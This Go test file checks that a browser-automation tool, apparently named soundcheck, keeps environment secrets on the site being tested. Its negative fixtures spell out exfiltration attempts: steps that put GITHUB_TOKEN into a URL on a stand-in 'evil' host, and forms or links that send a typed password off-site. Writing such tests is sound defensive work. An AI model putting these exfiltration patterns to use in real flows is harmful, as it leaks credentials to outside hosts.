// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package flow

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"

	"github.com/go-rod/rod/lib/proto"

	"github.com/RhythmShahriar/soundcheck/browser"
)

func TestEnvNames(t *testing.T) {
	f, err := Parse([]byte(`name: x
start: "/?u=${env:SOUNDCHECK_USER}"
steps:
  - fill: {selector: a, value: "${env:GITHUB_TOKEN}${env:SOUNDCHECK_USER}"}
  - goto: "/${env:AWS_SECRET_ACCESS_KEY}"
  - expect: {text: "${env:SHOWN}"}
  - expect: {message: {to: "${env:SOUNDCHECK_TO}"}}
`))
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(f.EnvNames(), ","); got != "AWS_SECRET_ACCESS_KEY,GITHUB_TOKEN,SHOWN,SOUNDCHECK_TO,SOUNDCHECK_USER" {
		t.Errorf("EnvNames = %s", got)
	}
	err = f.CheckEnv([]string{"SHOWN"})
	if err == nil || err.Error() != "flows read only SOUNDCHECK_* variables; to let this one read AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, pass --allow-env AWS_SECRET_ACCESS_KEY --allow-env GITHUB_TOKEN" {
		t.Errorf("CheckEnv: %v", err)
	}
	if err := f.CheckEnv([]string{"SHOWN", "GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY"}); err != nil {
		t.Errorf("all allowed: %v", err)
	}
	if !EnvAllowed("SOUNDCHECK_ANYTHING", nil) || EnvAllowed("HOME", nil) || EnvAllowed("SOUNDCHECK", nil) {
		t.Error("EnvAllowed")
	}
	if _, err := Parse([]byte("name: x\nstart: '/${fake:nope}'\nsteps: [{wait: 1}]\n")); err == nil || !strings.Contains(err.Error(), "start") {
		t.Errorf("start refs aren't checked: %v", err)
	}
}

// recorder is a server that logs every request it gets: the attacker's,
// in the negative fixtures.
type recorder struct {
	*httptest.Server
	mu  sync.Mutex
	got []string
}

func record(t *testing.T) *recorder {
	r := &recorder{}
	r.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		r.mu.Lock()
		r.got = append(r.got, req.URL.RequestURI())
		r.mu.Unlock()
		fmt.Fprint(w, `<html><body><input id="q"><p>Page</p></body></html>`)
	}))
	t.Cleanup(r.Close)
	return r
}

func (r *recorder) requests() []string {
	r.mu.Lock()
	defer r.mu.Unlock()
	return append([]string(nil), r.got...)
}

func hostOf(raw string) string { u, _ := url.Parse(raw); return u.Host }

func TestRunStaysOnSite(t *testing.T) {
	if _, _, err := browser.Find(browser.Options{NoDownload: true}); err != nil {
		t.Skip("no Chrome or Chromium installed: ", err)
	}
	b, err := browser.Launch(context.Background(), browser.Options{NoDownload: true})
	if err != nil {
		t.Fatal(err)
	}
	defer b.Close()
	env := func(k string) string {
		return map[string]string{"GITHUB_TOKEN": "ghp_DEMO0000SECRET", "SOUNDCHECK_NOTE": "hello-note"}[k]
	}
	for _, tc := range []struct {
		name, flow string
		allowEnv   []string
		allowHosts bool
		reached    string // what the attacker should see; "" for nothing
		fail       string // the first failure, or "" for none
	}{
		{"env sent off-site", "steps:\n  - goto: \"{evil}/collect?k=${env:GITHUB_TOKEN}\"\n", nil, false, "",
			"step 0: flows read only SOUNDCHECK_* variables; to let this one read GITHUB_TOKEN, pass --allow-env GITHUB_TOKEN"},
		{"env allowed, host not", "steps:\n  - goto: \"{evil}/collect?k=${env:GITHUB_TOKEN}\"\n", []string{"GITHUB_TOKEN"}, false, "",
			"step 1: {evilhost} isn't the site being checked ({site}); pass --allow-host {evilhost} to open it"},
		{"start off-site", "start: \"{evil}/start\"\nsteps:\n  - expect: {text: Page}\n", nil, false, "",
			"step 0: {evilhost} isn't the site being checked ({site}); pass --allow-host {evilhost} to open it"},
		{"typed then taken away", "steps:\n  - fill: {selector: \"#q\", value: \"${env:SOUNDCHECK_NOTE}\"}\n  - goto: \"{evil}/x?n=${env:SOUNDCHECK_NOTE}\"\n", nil, false, "",
			"step 2: {evilhost} isn't the site being checked ({site}); pass --allow-host {evilhost} to open it"},
		{"both allowed", "steps:\n  - goto: \"{evil}/collect?k=${env:GITHUB_TOKEN}\"\n", []string{"GITHUB_TOKEN"}, true,
			"/collect?k=ghp_DEMO0000SECRET", ""},
		{"host allowed", "start: \"{evil}/start\"\nsteps:\n  - expect: {text: Page}\n", nil, true, "/start", ""},
		{"own site with SOUNDCHECK_ env", "steps:\n  - goto: \"{site}/a?n=${env:SOUNDCHECK_NOTE}\"\n  - fill: {selector: \"#q\", value: \"${env:SOUNDCHECK_NOTE}\"}\n", nil, false, "", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			site, evil := record(t), record(t)
			r := strings.NewReplacer("{evilhost}", hostOf(evil.URL), "{evil}", evil.URL, "{site}", site.URL)
			f, err := Parse([]byte("name: x\n" + r.Replace(tc.flow)))
			if err != nil {
				t.Fatal(err)
			}
			page, err := b.Page(proto.TargetCreateTarget{})
			if err != nil {
				t.Fatal(err)
			}
			defer func() { _ = page.Close() }()
			base, _ := url.Parse(site.URL)
			o := Options{Base: base, Timeout: 2e9, Env: env, AllowEnv: tc.allowEnv}
			if tc.allowHosts {
				o.AllowHosts = []string{hostOf(evil.URL)}
			}
			fails := Run(context.Background(), page, f, o)
			got := ""
			if len(fails) > 0 {
				got = fmt.Sprintf("step %d: %v", fails[0].Step, fails[0].Err)
			}
			want := strings.NewReplacer("{evilhost}", hostOf(evil.URL), "{site}", hostOf(site.URL)).Replace(tc.fail)
			if got != want {
				t.Errorf("failure %q, want %q", got, want)
			}
			reqs := evil.requests()
			var hit []string
			for _, q := range reqs {
				if q != "/favicon.ico" {
					hit = append(hit, q)
				}
			}
			if strings.Join(hit, " ") != tc.reached {
				t.Errorf("the other host saw %q, want %q", hit, tc.reached)
			}
			for _, fl := range fails {
				if strings.Contains(fl.Err.Error(), "ghp_DEMO") || strings.Contains(fl.Err.Error(), "hello-note") {
					t.Errorf("secret in the failure: %v", fl.Err)
				}
			}
		})
	}
}

// TestSecretSafe covers the scheme rule: a value from the environment
// never goes from an https site to its plain http pages, unless that's
// this machine or PlainHTTP (--insecure-login) allows it.
func TestSecretSafe(t *testing.T) {
	https, _ := url.Parse("https://shop.test/")
	plain, _ := url.Parse("http://shop.test/")
	local, _ := url.Parse("https://127.0.0.1:20260/")
	for _, tc := range []struct {
		base      *url.URL
		plainHTTP bool
		target    string
		want      string // the error, "" for none
	}{
		{https, false, "https://shop.test/login", ""},
		{https, false, "https://www.shop.test/login", ""},
		{https, false, "http://shop.test/login", "shop.test is plain http on an https site (--insecure-login allows it)"},
		{https, true, "http://shop.test/login", ""},
		{https, false, "https://evil.test/", "evil.test isn't the site being checked (shop.test); pass --allow-host evil.test to open it"},
		{https, true, "http://evil.test/", "evil.test isn't the site being checked (shop.test); pass --allow-host evil.test to open it"},
		{plain, false, "http://shop.test/login", ""},
		{local, false, "http://127.0.0.1:20260/login", ""},
	} {
		r := &runner{o: Options{Base: tc.base, PlainHTTP: tc.plainHTTP}}
		got := ""
		if err := r.secretSafe(tc.target); err != nil {
			got = err.Error()
		}
		if got != tc.want {
			t.Errorf("%s from %s (PlainHTTP %v): %q, want %q", tc.target, tc.base, tc.plainHTTP, got, tc.want)
		}
	}
}

// TestRunKeepsSecretsOnSite covers what goto's check can't see: a form
// or link on the site that sends the page to another host.
func TestRunKeepsSecretsOnSite(t *testing.T) {
	if _, _, err := browser.Find(browser.Options{NoDownload: true}); err != nil {
		t.Skip("no Chrome or Chromium installed: ", err)
	}
	b, err := browser.Launch(context.Background(), browser.Options{NoDownload: true})
	if err != nil {
		t.Fatal(err)
	}
	defer b.Close()
	env := func(k string) string { return map[string]string{"SOUNDCHECK_PASSWORD": "pw-DEMO-secret"}[k] }
	const fill = "  - fill: {selector: \"#q\", value: \"${env:SOUNDCHECK_PASSWORD}\"}\n"
	for _, tc := range []struct {
		name, action, flow string
		allowHosts         bool
		reached            string // what the other host should see; "" for nothing
		fail               string // the first failure, or "" for none
	}{
		{"submit to another host", "{evil}/collect", fill + "  - submit: {selector: form}\n", false, "",
			"step 2: not sending what the flow typed: {evilhost} isn't the site being checked ({site}); pass --allow-host {evilhost} to open it"},
		{"click a submit button", "{evil}/collect", fill + "  - click: {selector: \"#go\"}\n", false, "",
			"step 2: not sending what the flow typed: {evilhost} isn't the site being checked ({site}); pass --allow-host {evilhost} to open it"},
		{"click a link after typing", "/", fill + "  - click: {selector: \"#away\"}\n", false, "",
			"step 2: not sending what the flow typed: {evilhost} isn't the site being checked ({site}); pass --allow-host {evilhost} to open it"},
		{"a link leads away, then a fill", "/", "  - click: {selector: \"#away\"}\n" + fill, false, "/landing",
			"step 1: it led off the site: {evilhost} isn't the site being checked ({site}); pass --allow-host {evilhost} to open it"},
		{"submit on the site", "/done", fill + "  - submit: {selector: form}\n", false, "", ""},
		{"host allowed", "{evil}/collect", fill + "  - submit: {selector: form}\n", true, "/collect?q=pw-DEMO-secret", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			evil := record(t)
			r := strings.NewReplacer("{evilhost}", hostOf(evil.URL), "{evil}", evil.URL)
			html := r.Replace(`<html><body><form method="get" action="` + tc.action + `"><input id="q" name="q">
<button id="go">Go</button></form><a id="away" href="{evil}/landing">Away</a></body></html>`)
			site := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { fmt.Fprint(w, html) }))
			defer site.Close()
			f, err := Parse([]byte("name: x\nsteps:\n" + tc.flow))
			if err != nil {
				t.Fatal(err)
			}
			page, err := b.Page(proto.TargetCreateTarget{})
			if err != nil {
				t.Fatal(err)
			}
			defer func() { _ = page.Close() }()
			base, _ := url.Parse(site.URL)
			o := Options{Base: base, Timeout: 2e9, Env: env}
			if tc.allowHosts {
				o.AllowHosts = []string{hostOf(evil.URL)}
			}
			fails := Run(context.Background(), page, f, o)
			got := ""
			if len(fails) > 0 {
				got = fmt.Sprintf("step %d: %v", fails[0].Step, fails[0].Err)
			}
			want := strings.NewReplacer("{evilhost}", hostOf(evil.URL), "{site}", hostOf(site.URL)).Replace(tc.fail)
			if got != want {
				t.Errorf("failure %q, want %q", got, want)
			}
			var hit []string
			for _, q := range evil.requests() {
				if q != "/favicon.ico" {
					hit = append(hit, q)
				}
			}
			if strings.Join(hit, " ") != tc.reached {
				t.Errorf("the other host saw %q, want %q", hit, tc.reached)
			}
		})
	}
}
